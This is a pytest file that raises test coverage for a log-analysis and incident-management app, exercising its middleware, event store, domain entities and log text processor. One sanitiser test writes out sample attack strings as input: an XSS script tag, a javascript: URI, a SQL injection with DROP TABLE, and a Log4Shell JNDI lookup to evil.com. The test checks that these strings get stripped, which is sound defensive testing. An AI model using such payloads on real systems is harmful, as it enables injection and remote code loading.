"""Quick tests to improve coverage for remaining modules."""

from datetime import datetime
from unittest.mock import MagicMock, patch

import pytest

from app.domain.entities import (
    Incident,
    IncidentSeverity,
    IncidentStatus,
    LogEntry,
    LogLevel,
)
from app.domain.value_objects import AnomalyScore, MetricValue, SourceSystem
from app.events.event_store import InMemoryEventStore
from app.events.middleware import AuditMiddleware, LoggingMiddleware, MetricsMiddleware
from app.handlers.event_handlers import (
    IncidentEventHandler,
    LogEventHandler,
    MLEventHandler,
)

# Import modules that need coverage
from app.infrastructure.ml.preprocessing.text_processor import LogTextProcessor


class TestMiddleware:
    """Tests for event middleware."""

    @pytest.mark.asyncio
    async def test_audit_middleware(self):
        """Test AuditMiddleware."""
        middleware = AuditMiddleware()

        event = MagicMock()
        event.event_type = "test.event"
        event.event_id = "123"

        next_called = False

        async def next_middleware(e):
            nonlocal next_called
            next_called = True

        await middleware.process_event(event, next_middleware)
        assert next_called

    @pytest.mark.asyncio
    async def test_logging_middleware(self):
        """Test LoggingMiddleware."""
        middleware = LoggingMiddleware()

        event = MagicMock()
        event.event_type = "test.event"

        next_called = False

        async def next_middleware(e):
            nonlocal next_called
            next_called = True

        with patch("app.events.middleware.logger") as mock_logger:
            await middleware.process_event(event, next_middleware)
            mock_logger.info.assert_called()
            assert next_called

    @pytest.mark.asyncio
    async def test_metrics_middleware(self):
        """Test MetricsMiddleware."""
        middleware = MetricsMiddleware()

        event = MagicMock()
        event.event_type = "test.event"

        next_called = False

        async def next_middleware(e):
            nonlocal next_called
            next_called = True

        await middleware.process_event(event, next_middleware)
        assert next_called


class TestEventStore:
    """Tests for InMemoryEventStore."""

    def test_event_store_initialization(self):
        """Test event store initialization."""
        store = InMemoryEventStore()
        assert len(store.events) == 0

    def test_append_event(self):
        """Test appending events."""
        store = InMemoryEventStore()

        event = MagicMock()
        event.event_id = "123"
        event.event_type = "test.event"

        store.append(event)
        assert len(store.events) == 1
        assert store.events[0] == event

    def test_get_events_by_type(self):
        """Test getting events by type."""
        store = InMemoryEventStore()

        event1 = MagicMock()
        event1.event_type = "type1"
        event2 = MagicMock()
        event2.event_type = "type2"

        store.append(event1)
        store.append(event2)

        type1_events = store.get_events("type1")
        assert len(type1_events) == 1
        assert type1_events[0] == event1

    def test_get_all_events(self):
        """Test getting all events."""
        store = InMemoryEventStore()

        event1 = MagicMock()
        event2 = MagicMock()

        store.append(event1)
        store.append(event2)

        all_events = store.get_all_events()
        assert len(all_events) == 2


class TestEventHandlers:
    """Tests for event handlers."""

    @pytest.mark.asyncio
    async def test_log_event_handler(self):
        """Test LogEventHandler."""
        repository = MagicMock()
        handler = LogEventHandler(repository)

        event = MagicMock()
        event.event_type = "log.entry_created"
        event.data = {"log_id": "123", "message": "test"}

        await handler.handle(event)
        # Handler should process the event without errors

    @pytest.mark.asyncio
    async def test_incident_event_handler(self):
        """Test IncidentEventHandler."""
        repository = MagicMock()
        handler = IncidentEventHandler(repository)

        event = MagicMock()
        event.event_type = "incident.created"
        event.data = {"incident_id": "123"}

        await handler.handle(event)
        # Handler should process the event without errors

    @pytest.mark.asyncio
    async def test_ml_event_handler(self):
        """Test MLEventHandler."""
        repository = MagicMock()
        handler = MLEventHandler(repository)

        event = MagicMock()
        event.event_type = "ml.model_trained"
        event.data = {"model_id": "123"}

        await handler.handle(event)
        # Handler should process the event without errors


class TestDomainEntities:
    """Tests for domain entities to improve coverage."""

    def test_log_entry_with_metadata(self):
        """Test LogEntry with metadata."""
        entry = LogEntry(
            log_id="123",
            message="Test message",
            level=LogLevel.INFO,
            timestamp=datetime.now(),
            source="test",
            metadata={"key": "value"},
        )

        assert entry.metadata["key"] == "value"

    def test_log_entry_severity_methods(self):
        """Test LogEntry severity checking methods."""
        error_entry = LogEntry(
            log_id="123",
            message="Error",
            level=LogLevel.ERROR,
            timestamp=datetime.now(),
            source="test",
        )

        info_entry = LogEntry(
            log_id="124",
            message="Info",
            level=LogLevel.INFO,
            timestamp=datetime.now(),
            source="test",
        )

        assert error_entry.is_error_level()
        assert not info_entry.is_error_level()

    def test_incident_creation_with_all_fields(self):
        """Test Incident creation with all fields."""
        incident = Incident(
            incident_id="123",
            title="Test Incident",
            description="Test description",
            severity=IncidentSeverity.HIGH,
            status=IncidentStatus.OPEN,
            created_at=datetime.now(),
            source="test",
            affected_systems=["system1", "system2"],
            metadata={"key": "value"},
        )

        assert incident.title == "Test Incident"
        assert incident.severity == IncidentSeverity.HIGH
        assert len(incident.affected_systems) == 2

    def test_incident_status_methods(self):
        """Test Incident status checking methods."""
        open_incident = Incident(
            incident_id="123",
            title="Open",
            description="desc",
            severity=IncidentSeverity.MEDIUM,
            status=IncidentStatus.OPEN,
            created_at=datetime.now(),
            source="test",
        )

        closed_incident = Incident(
            incident_id="124",
            title="Closed",
            description="desc",
            severity=IncidentSeverity.LOW,
            status=IncidentStatus.RESOLVED,
            created_at=datetime.now(),
            source="test",
        )

        assert open_incident.is_open()
        assert not closed_incident.is_open()
        assert closed_incident.is_resolved()

    def test_incident_severity_comparison(self):
        """Test incident severity comparison."""
        high_incident = Incident(
            incident_id="123",
            title="High",
            description="desc",
            severity=IncidentSeverity.CRITICAL,
            status=IncidentStatus.OPEN,
            created_at=datetime.now(),
            source="test",
        )

        assert high_incident.is_critical()
        assert not high_incident.is_low_priority()


class TestValueObjects:
    """Tests for value objects to improve coverage."""

    def test_anomaly_score_edge_cases(self):
        """Test AnomalyScore edge cases."""
        # Test with minimum values
        min_score = AnomalyScore(value=0.0, confidence=0.0, threshold=0.0)
        assert not min_score.is_anomaly()
        assert min_score.severity_level() == "normal"

        # Test with maximum values
        max_score = AnomalyScore(value=1.0, confidence=1.0, threshold=0.5)
        assert max_score.is_anomaly()
        assert max_score.severity_level() == "critical"

    def test_anomaly_score_boundary_conditions(self):
        """Test AnomalyScore boundary conditions."""
        boundary_score = AnomalyScore(value=0.75, confidence=0.5, threshold=0.75)
        assert boundary_score.is_anomaly()  # value equals threshold

        just_below = AnomalyScore(value=0.74, confidence=0.5, threshold=0.75)
        assert not just_below.is_anomaly()

    def test_metric_value_normalization(self):
        """Test MetricValue normalization."""
        # Test percentage over 100%
        high_percentage = MetricValue(name="cpu_usage_percent", value=150.0, unit="%")
        normalized = high_percentage.normalize()
        assert normalized.value == 100.0

        # Test percentage under 1%
        low_percentage = MetricValue(name="success_rate_percent", value=0.5, unit="%")
        normalized = low_percentage.normalize()
        assert normalized.value == 1.0

    def test_metric_value_negative_allowed(self):
        """Test MetricValue with negative values where allowed."""
        # Temperature can be negative
        temp_metric = MetricValue(name="temperature_celsius", value=-10.0, unit="°C")
        assert temp_metric.value == -10.0

        # Balance can be negative
        balance_metric = MetricValue(name="account_balance", value=-100.0, unit="USD")
        assert balance_metric.value == -100.0

    def test_source_system_identifiers(self):
        """Test SourceSystem identifier methods."""
        prod_system = SourceSystem(
            name="api-server", environment="production", version="1.2.3"
        )

        assert prod_system.is_production()
        assert prod_system.full_identifier() == "api-server-production-1.2.3"

        dev_system = SourceSystem(
            name="web-app", environment="development", version="0.1.0"
        )

        assert not dev_system.is_production()
        assert dev_system.full_identifier() == "web-app-development-0.1.0"


class TestTextProcessorEdgeCases:
    """Tests for text processor edge cases."""

    def test_tokenize_edge_cases(self):
        """Test tokenize with edge cases."""
        processor = LogTextProcessor()

        # Empty string
        tokens = processor.tokenize("")
        assert len(tokens) == 2  # START + END tokens

        # Very short string
        tokens = processor.tokenize("a")
        assert len(tokens) == 3  # START + "a" + END

        # String with only whitespace
        tokens = processor.tokenize("   ")
        assert len(tokens) == 2  # START + END (whitespace normalized)

    def test_encode_message_edge_cases(self):
        """Test encode_message with edge cases."""
        processor = LogTextProcessor(max_sequence_length=10)

        # Build minimal vocabulary
        processor.build_vocabulary(["test message", "hello world"])

        # Empty message
        encoded, length = processor.encode_message("")
        assert encoded.shape == (10,)  # max_sequence_length
        assert length == 2  # START + END tokens

        # Very long message (should be truncated)
        long_message = " ".join(["word"] * 20)
        encoded, length = processor.encode_message(long_message)
        assert encoded.shape == (10,)
        assert length == 10  # Truncated to max_sequence_length

    def test_vocabulary_stats(self):
        """Test vocabulary statistics."""
        processor = LogTextProcessor(max_vocab_size=100)
        processor.build_vocabulary(["hello world", "test message", "another example"])

        stats = processor.get_vocab_stats()

        assert "vocab_size" in stats
        assert "max_sequence_length" in stats
        assert "special_tokens" in stats
        assert "most_common_words" in stats
        assert "coverage" in stats
        assert stats["vocab_size"] > 0

    def test_clean_log_message_comprehensive(self):
        """Test comprehensive log message cleaning."""
        processor = LogTextProcessor()

        # Test with multiple threat types in one message
        complex_threat = """
        <script>alert('xss')</script>
        javascript:void(0)
        eval(malicious_code)
        SELECT * FROM users; DROP TABLE users;
        ${jndi:ldap://evil.com}
        """

        cleaned = processor.clean_log_message(complex_threat)

        # Should remove all dangerous patterns
        dangerous_patterns = ["script", "javascript", "eval", "select", "drop", "jndi"]
        for pattern in dangerous_patterns:
            assert pattern not in cleaned.lower()

    def test_build_vocabulary_error_handling(self):
        """Test vocabulary building error handling."""
        processor = LogTextProcessor()

        # Empty message list should raise
        with pytest.raises(ValueError):
            processor.build_vocabulary([])

        # Should handle messages that cause tokenization errors
        problematic_messages = [
            "normal message",
            "",  # Empty message
            " ",  # Whitespace only
            "a" * 10000,  # Very long message
        ]

        processor.build_vocabulary(problematic_messages)
        assert processor.vocab_size > 0

    def test_decode_message_edge_cases(self):
        """Test decode_message edge cases."""
        processor = LogTextProcessor()
        processor.build_vocabulary(["test message"])

        # Empty tensor
        import torch

        empty_tensor = torch.tensor([], dtype=torch.long)
        decoded = processor.decode_message(empty_tensor)
        assert decoded == ""

        # Tensor with only padding
        pad_idx = processor.word_to_idx[processor.PAD_TOKEN]
        pad_tensor = torch.tensor([pad_idx, pad_idx, pad_idx], dtype=torch.long)
        decoded = processor.decode_message(pad_tensor)
        assert decoded == ""


class TestCoverageHelpers:
    """Helper tests to hit uncovered lines."""

    def test_log_level_string_representation(self):
        """Test LogLevel string representation."""
        level = LogLevel.ERROR
        assert str(level) == "ERROR"

    def test_incident_severity_string_representation(self):
        """Test IncidentSeverity string representation."""
        severity = IncidentSeverity.HIGH
        assert str(severity) == "HIGH"

    def test_incident_status_string_representation(self):
        """Test IncidentStatus string representation."""
        status = IncidentStatus.OPEN
        assert str(status) == "OPEN"

    def test_value_object_immutability_attempts(self):
        """Test value object immutability."""
        score = AnomalyScore(value=0.5, confidence=0.8, threshold=0.6)

        # These should not be possible (frozen dataclass)
        with pytest.raises(AttributeError):
            score.value = 0.9

    def test_entity_string_representations(self):
        """Test entity string representations."""
        log_entry = LogEntry(
            log_id="123",
            message="Test",
            level=LogLevel.INFO,
            timestamp=datetime.now(),
            source="test",
        )

        # Should have meaningful string representation
        str_repr = str(log_entry)
        assert "123" in str_repr

    def test_processor_private_methods(self):
        """Test text processor private methods."""
        processor = LogTextProcessor()

        # Test word validation
        assert processor._is_valid_vocab_word("normal_word")
        assert not processor._is_valid_vocab_word("")  # Empty
        assert not processor._is_valid_vocab_word("a" * 100)  # Too long
        assert not processor._is_valid_vocab_word("<script>")  # Suspicious

    def test_interfaces_instantiation(self):
        """Test that interfaces can be imported."""
        from app.core.interfaces import BaseRepository

        # Should be importable (even if not directly instantiable)
        assert hasattr(BaseRepository, "__abstractmethods__")

    def test_ml_service_private_methods(self):
        """Test MLService private methods if accessible."""
        from app.services.ml_service import MLService

        service = MLService()

        # Test batch size property
        assert hasattr(service, "batch_size")
        assert service.batch_size > 0

        # Test max sequence length property
        assert hasattr(service, "max_sequence_length")
        assert service.max_sequence_length > 0
